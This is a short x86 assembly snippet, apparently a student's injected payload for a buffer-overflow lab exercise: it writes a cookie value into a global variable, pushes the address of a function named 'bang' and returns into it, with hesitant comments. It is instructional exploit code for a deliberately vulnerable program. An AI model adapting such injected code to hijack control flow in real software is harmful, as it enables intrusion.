push $0x08048c1d 		#Push address for bang onto the stack?
movl $0x2948c56b,(0x804d100)	#Set the global value equal to the cookie
ret				#jump into bang?
